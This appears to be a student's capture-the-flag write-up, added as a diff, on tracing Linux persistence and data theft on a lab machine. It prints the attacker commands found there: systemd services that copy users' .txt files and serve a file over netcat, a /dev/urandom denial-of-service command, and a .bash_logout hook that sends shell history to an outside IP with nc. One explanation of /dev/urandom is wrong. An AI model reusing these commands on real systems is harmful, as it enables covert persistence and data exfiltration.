@@ -23,8 +23,125 @@ The chants were executed by a cronjob that executed a bash script called offerin
 
 
 
+FINDEVIL 2:
 
-/bin/bash -c netcat -lp 3389 < /tmp/NMAP_all_hosts.txt
+Scenario: Someone or something is stealing files with a .txt extension from user directories. Determine how these thefts are occurring.
+Task: Identify the command being ran and how it occurs.
+Flag format: command,how it occurs
+Machine: Terra
+
+
+Looked through all cronjobs, there was nothing that looked like what I was looking for.
+Other form of persistance in linux is services.
+Look at all services in /lib/systemd/system.
+These are all bash scripts, so I can cat them, grep them, etc.
+use:  ls -l | grep -r 'txt'
+This command returns a few lines of code. Here I see what i'm looking for. 
+The command being ran is: find /home -name \*.txt -exec cp {} /tmp \;
+The service name is:  vestrisecreta.service
+
+
+
+
+
+
+FINDEVIL 3:
+
+Scenario: Text files are being exfiltrated from the machine using a network connection. The connections still occur post-reboot, according to network analysts.
+The junior analysts are having a hard time with attribution because no strange programs or ports are running, and the connection seems to only occur in 60-second intervals, every 15 minutes.
+Task: Determine the means of persistence used by the program, and the port used. The flag is the command that allows exfiltration, and the file its persistence mechanism uses.
+Flag format: command,persistence
+Machine: Terra
+
+in htop, there is a process that pops up periodically showing: 
+'netcat -lp 3389 < /tmp/NMAP_all_hosts.txt'
+Upon further investigation into the services, there is a service that runs that command.
+I found this by using the command
+is -l | grep -r 'txt'
+This shows me whatischaos.service.
+When I cat whatischaos.service, it reveals that it was running the command from htop.
+whatischaos.service runs based off of whatischaos.timer.
+the command is: 'netcat -lp 3389 < /tmp/NMAP_all_hosts.txt'
+the file is: whatischaos.timer
+
+
+
+
+
+
+
+
+FINDEVIL 4: 
+
+Scenario: The web server has been modified by an unknown hacktivist group. Users accessing the web server are reporting crashes and insane disk usage.
+Task: Identify the Cyber Attack Method used by the group, and the command running.
+Flag format: method,command
+Machine: Terra
+Try not to break your machine on this one...
+
+in htop, there is an apache process that looks like:
+/bin/bash -c /bin/apache3 -lp 443 < /dev/urandom
+That's sus.
+/dev/urandom is basically a random number generator for linux proceses.
+The command is setting the listening port randomly for the web server.
+Now I investigate the services to see what is executing the command. 
+To find the command from htop, I use the command:
+ls -l | grep -r '/dev/urandom'
+This brings me to: apache3.service
+it has the dos command in it. 
+The method is DOS because they're making the web server unusable. 
+the command is: /bin/apache3 -lp 443 < /dev/urandom
+
+
+
+
+FINDEVIL 5:
+
+
+Scenario: Analysts have found a dump of commands on the Internet that refer to the Terra machine. The command history for one of the users with an interactive login is being stolen via unknown means. The network analysts can’t find any persistent connections, but notice a spike in traffic on logon and logoff.
+Task: Identify how the command history is stolen from the machine.
+The flag is the file used to execute the commands, and where they are sent.
+Flag format: /absolute/path/to/file,IP:port
+Machine: Terra
+
+
+cat ~/.bash_logout  
+
+Result:
+
+history -w /tmp/systemd-private.$HEAD-systemd-resolved.service-$HEAD2
+nc -w2 12.54.37.8 12000 < /tmp/systemd-private.$HEAD-systemd-resolved.service-$HEAD2
+
+
+I knew that I had to find why it was happening on logon and logoff. This is wheere I checked and got lucky.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
